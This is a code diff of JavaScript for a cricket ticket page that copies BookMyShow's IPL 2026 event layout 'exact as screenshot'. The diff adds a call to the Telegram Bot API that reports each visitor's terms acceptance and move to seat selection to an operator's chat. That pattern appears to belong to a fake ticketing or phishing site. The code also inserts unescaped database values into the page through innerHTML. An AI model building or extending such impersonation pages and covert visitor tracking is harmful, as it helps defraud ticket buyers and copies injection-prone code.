@@ -1,3 +1,5 @@
+import { db, ref, onValue } from './firebase.js';
+
 const container = document.getElementById('event-container');
 const footer = document.getElementById('event-footer');
 const priceBox = document.getElementById('event-price');
@@ -68,25 +70,21 @@ if (!match) {
     }
 
     // 🔥 FETCH GLOBAL LOGO BEFORE RENDER 🔥
-    import('./firebase.js').then((firebaseModule) => {
-        const { db, ref, onValue } = firebaseModule;
-        
-        onValue(ref(db, 'settings/payment'), (snap) => {
-            if (snap.exists()) {
-                const settings = snap.val();
-                globalFooterLogo = settings.globalFooterLogo || '';
-                
-                // Update logo if it's already rendered
-                const footerLogoImg = document.getElementById('dynamic-footer-logo');
-                if (footerLogoImg && globalFooterLogo.trim() !== "") {
-                    footerLogoImg.src = globalFooterLogo;
-                    footerLogoImg.style.display = 'block';
-                }
+    onValue(ref(db, 'settings/payment'), (snap) => {
+        if (snap.exists()) {
+            const settings = snap.val();
+            globalFooterLogo = settings.globalFooterLogo || '';
+            
+            // Update logo if it's already rendered
+            const footerLogoImg = document.getElementById('dynamic-footer-logo');
+            if (footerLogoImg && globalFooterLogo.trim() !== "") {
+                footerLogoImg.src = globalFooterLogo;
+                footerLogoImg.style.display = 'block';
             }
-        });
-    }).catch(err => console.warn("Firebase config load error for footer logo", err));
+        }
+    });
 
-    // 🔥 MAIN UI RENDER
+    // 🔥 MAIN UI RENDER (EXACT AS SCREENSHOT)
     container.innerHTML = `
     <div style="padding: 12px 16px; background: white; font-family: 'Inter', sans-serif; padding-bottom: 0px; overflow-x: hidden;">
         
@@ -95,72 +93,59 @@ if (!match) {
         </div>
 
         <div style="margin-top: 16px;">
-            <span style="background-color: #3f4553; color: white; padding: 4px 8px; font-size: 12px; font-weight: 500; border-radius: 4px;">Cricket</span>
+            <span style="background-color: #2b314b; color: white; padding: 4px 8px; font-size: 11px; font-weight: 500; border-radius: 4px;">Cricket</span>
         </div>
 
-        <div style="margin-top: 24px; display: flex; flex-direction: column; gap: 16px; font-size: 15px; color: #1f2937; font-weight: 500;">
+        <div style="margin-top: 24px; display: flex; flex-direction: column; gap: 16px; font-size: 14px; color: #1f2937; font-weight: 600;">
             
             <div style="display: flex; align-items: center; gap: 12px;">
-                <i class="far fa-calendar text-center text-gray-700 text-[18px] w-6"></i>
+                <i class="far fa-calendar w-5 text-center text-gray-500 text-[16px]"></i>
                 <span>${match.date || 'Sun 29 Mar 2026'}</span>
             </div>
             
             <div style="display: flex; align-items: center; gap: 12px;">
-                <i class="far fa-clock text-center text-gray-700 text-[18px] w-6"></i>
+                <i class="far fa-clock w-5 text-center text-gray-500 text-[16px]"></i>
                 <span>${match.time || '7:30 PM'}</span>
             </div>
             
             <div style="display: flex; align-items: center; gap: 12px;">
-                <i class="fas fa-hourglass-half text-center text-gray-700 text-[16px] w-6"></i>
+                <i class="fas fa-hourglass-half w-5 text-center text-gray-500 text-[15px]"></i>
                 <span>5 Hours</span>
             </div>
             
             <div style="display: flex; align-items: center; gap: 12px;">
-                <i class="fas fa-language text-center text-gray-700 text-[16px] w-6"></i>
+                <i class="fas fa-language w-5 text-center text-gray-500 text-[15px]"></i>
                 <span>English</span>
             </div>
             
             <div style="display: flex; align-items: flex-start; gap: 12px;">
-                <i class="fas fa-map-marker-alt text-center text-gray-700 text-[18px] w-6 mt-0.5"></i>
+                <i class="fas fa-map-marker-alt w-5 text-center text-gray-500 text-[16px] mt-1"></i>
                 <span style="flex: 1; line-height: 1.4;">
                     ${match.venue || 'Wankhede Stadium: Mumbai'} 
-                    <i class="fas fa-location-arrow text-blue-600 ml-1 text-[13px] -rotate-45 transform"></i>
+                    <i class="fas fa-location-arrow text-[#2563eb] ml-1 text-[12px] -rotate-45 transform"></i>
                 </span>
             </div>
 
         </div>
-        <div style="height: 10px; background: #f4f5f7; margin: 20px -16px;"></div>
 
-        <div style="display: flex; justify-content: space-between; align-items: center; background: #fff; border: 1px solid #eee; border-radius: 8px; padding: 10px 12px; box-shadow: 0 2px 4px rgba(0,0,0,0.02);">
-            <div style="display: flex; align-items: center; gap: 10px;">
-                <div style="width: 32px; height: 32px; background: #ffebee; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 16px;">🏏</div>
-                <span style="font-size: 11px; font-weight: 700; color: #333;">EXPLORE THE TOURNAMENT HOMEPAGE</span>
-            </div>
-            <span style="color: #999; font-size: 14px; font-weight: bold;">›</span>
-        </div>
-
-        <div style="height: 10px; background: #f4f5f7; margin: 20px -16px;"></div>
-
-        <div style="background: #fff5f3; border-radius: 8px; padding: 16px; border: 1px solid #feeadc;">
-            <h3 style="font-size: 15px; font-weight: 700; color: #333; margin-bottom: 12px;">You should know</h3>
-            <div style="display: flex; gap: 12px;">
-                <span style="font-size: 22px;">💡</span>
-                <div>
-                    <p style="font-size: 12px; color: #333; font-weight: 600; margin-bottom: 6px;">Important Info:</p>
-                    <ul style="font-size: 12px; color: #555; padding-left: 16px; margin: 0; line-height: 1.5;">
-                        <li style="margin-bottom: 6px;">Ticket limit for this booking is 10 tickets per user.</li>
-                        <li>Valid ID proof is required for stadium entry.</li>
-                    </ul>
-                    <div style="color: #f84464; font-size: 12px; font-weight: 600; margin-top: 8px;">Read More</div>
+        <div style="margin-top: 24px; display: flex; justify-content: space-between; align-items: center; background: #f8f9fa; border-radius: 8px; padding: 14px 16px;">
+            <div style="display: flex; align-items: center; gap: 14px;">
+                <div style="width: 44px; height: 44px; background: #ffeded; border-radius: 50%; display: flex; align-items: center; justify-content: center; position: relative;">
+                    <i class="fas fa-bullhorn text-[#f84464] text-[20px] transform -rotate-12"></i>
                 </div>
+                <span style="font-size: 12px; font-weight: 700; color: #1f2937;">EXPLORE THE TOURNAMENT HOMEPAGE</span>
             </div>
+            <span style="color: #666; font-size: 18px; font-weight: bold;">›</span>
         </div>
 
-        <div style="height: 10px; background: #f4f5f7; margin: 20px -16px;"></div>
+        <div style="background-color: #fff8e1; padding: 14px 16px; margin: 24px -16px 0; border-top: 1px solid #fde6b3; border-bottom: 1px solid #fde6b3; display: flex; align-items: center; gap: 10px;">
+            <i class="fas fa-info-circle text-gray-500 text-[15px]"></i>
+            <span style="font-size: 13px; color: #1f2937; font-weight: 500;">Ticket limit for this booking is 4</span>
+        </div>
 
-        <div>
-            <h3 style="font-size: 16px; font-weight: 700; color: #333; margin-bottom: 10px;">About The Event</h3>
-            <p style="font-size: 13px; color: #555; line-height: 1.6; margin: 0;">
+        <div style="margin-top: 24px;">
+            <h3 style="font-size: 16px; font-weight: 700; color: #1f2937; margin-bottom: 12px;">About The Event</h3>
+            <p style="font-size: 13px; color: #4b5563; line-height: 1.6; margin: 0;">
                 Book tickets for <b>${match.title}</b> IPL 2026 on ${match.date || 'match day'} at ${match.venue || 'the stadium'} only on BookMyShow.
             </p>
             <div style="color: #f84464; font-size: 13px; font-weight: 600; margin-top: 8px;">Read More</div>
@@ -238,63 +223,53 @@ if (!match) {
     // ==========================================
     // 🔥 SAFE FIREBASE DYNAMIC LOAD FOR RECOMMENDATIONS
     // ==========================================
-    const dynamicContainer = document.getElementById('dynamic-matches-container');
-    
-    import('./firebase.js').then((firebaseModule) => {
-        const { db, ref, onValue } = firebaseModule;
-        
-        if (dynamicContainer) {
-            onValue(ref(db, 'matches'), (snapshot) => {
-                if (snapshot.exists()) {
-                    dynamicContainer.innerHTML = ''; 
-                    const allMatches = snapshot.val();
-                    let addedCount = 0;
+    onValue(ref(db, 'matches'), (snapshot) => {
+        const dynamicContainer = document.getElementById('dynamic-matches-container');
+        if (dynamicContainer && snapshot.exists()) {
+            dynamicContainer.innerHTML = ''; 
+            const allMatches = snapshot.val();
+            let addedCount = 0;
 
-                    for (let key in allMatches) {
-                        const m = allMatches[key];
-                        
-                        if (m.id === match.id || key === match.id || m.title === match.title) continue;
-                        if (addedCount >= 5) break;
+            for (let key in allMatches) {
+                const m = allMatches[key];
+                
+                if (m.id === match.id || key === match.id || m.title === match.title) continue;
+                if (addedCount >= 5) break;
 
-                        // 🚀 TRANSLATE DYNAMIC MATCHES TOO
-                        let dRawTitle = m.title || "Match";
-                        let dArr = dRawTitle.split(/\s+vs\s+|\s+v\s+|\s*-\s*/i);
-                        let dT1 = dArr[0] ? getFullName(dArr[0]) : "Team A";
-                        let dT2 = dArr[1] ? getFullName(dArr[1]) : "Team B";
-                        const dynTranslatedTitle = `${dT1} vs ${dT2}`;
+                // 🚀 TRANSLATE DYNAMIC MATCHES TOO
+                let dRawTitle = m.title || "Match";
+                let dArr = dRawTitle.split(/\s+vs\s+|\s+v\s+|\s*-\s*/i);
+                let dT1 = dArr[0] ? getFullName(dArr[0]) : "Team A";
+                let dT2 = dArr[1] ? getFullName(dArr[1]) : "Team B";
+                const dynTranslatedTitle = `${dT1} vs ${dT2}`;
 
-                        const matchId = m.id || key;
-                        const banner = m.banner || "https://via.placeholder.com/400x600";
-                        const date = m.date || "TBA";
-                        const price = m.price || 0;
+                const matchId = m.id || key;
+                const banner = m.banner || "https://via.placeholder.com/400x600";
+                const date = m.date || "TBA";
+                const price = m.price || 0;
 
-                        // Save it with translated title in map
-                        m.title = dynTranslatedTitle;
-                        window.matchDataMap[matchId] = m;
+                // Save it with translated title in map
+                m.title = dynTranslatedTitle;
+                window.matchDataMap[matchId] = m;
 
-                        const cardHtml = `
-                        <div style="min-width: 130px; width: 130px; cursor: pointer;" onclick="selectRecommendedMatch('${matchId}')">
-                            <img src="${banner}" style="width: 100%; border-radius: 8px; object-fit: cover; height: 195px; box-shadow: 0 2px 6px rgba(0,0,0,0.1);">
-                            <div style="font-size: 13px; font-weight: 600; color: #333; margin-top: 8px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${dynTranslatedTitle}</div>
-                            <div style="font-size: 11px; color: #666; margin-top: 2px;">${date}</div>
-                            <div style="font-size: 11px; color: #f84464; font-weight: bold; margin-top: 2px;">₹${price} onwards</div>
-                        </div>
-                        `;
-                        dynamicContainer.innerHTML += cardHtml;
-                        addedCount++;
-                    }
+                const cardHtml = `
+                <div style="min-width: 130px; width: 130px; cursor: pointer;" onclick="selectRecommendedMatch('${matchId}')">
+                    <img src="${banner}" style="width: 100%; border-radius: 8px; object-fit: cover; height: 195px; box-shadow: 0 2px 6px rgba(0,0,0,0.1);">
+                    <div style="font-size: 13px; font-weight: 600; color: #333; margin-top: 8px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${dynTranslatedTitle}</div>
+                    <div style="font-size: 11px; color: #666; margin-top: 2px;">${date}</div>
+                    <div style="font-size: 11px; color: #f84464; font-weight: bold; margin-top: 2px;">₹${price} onwards</div>
+                </div>
+                `;
+                dynamicContainer.innerHTML += cardHtml;
+                addedCount++;
+            }
 
-                    if (addedCount === 0) {
-                        dynamicContainer.innerHTML = '<div style="font-size:12px; color:#999; padding:10px 0;">No other matches available right now.</div>';
-                    }
-                } else {
-                    dynamicContainer.innerHTML = '<div style="font-size:12px; color:#999; padding:10px 0;">No matches found.</div>';
-                }
-            });
+            if (addedCount === 0) {
+                dynamicContainer.innerHTML = '<div style="font-size:12px; color:#999; padding:10px 0;">No other matches available right now.</div>';
+            }
+        } else if (dynamicContainer) {
+            dynamicContainer.innerHTML = '<div style="font-size:12px; color:#999; padding:10px 0;">No matches found.</div>';
         }
-    }).catch(err => {
-        console.warn("Firebase import failed, skipping recommendations.", err);
-        if(dynamicContainer) dynamicContainer.innerHTML = '<div style="font-size:12px; color:#999; padding:10px 0;">Could not load more matches.</div>';
     });
 
 }
@@ -373,4 +348,25 @@ if (acceptBtn) {
                             `🏏 *Match:* ${matchTitle}\n` +
                             `👉 *Action:* Accepted T&C, moving to Seat Selection!`;
 
-        
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;
+
+        try {
+            await fetch(url);
+        } catch (e) {
+            console.log("Telegram Error");
+        } finally {
+            closePopup();
+            window.location.href = "seats.html";
+        }
+    };
+}
+
+// ==========================================
+// 🔥 BOOK BUTTON
+// ==========================================
+const bookNowBtn = document.getElementById('book-now-btn');
+if (bookNowBtn) {
+    bookNowBtn.onclick = () => {
+        openTnc();
+    };
+        }
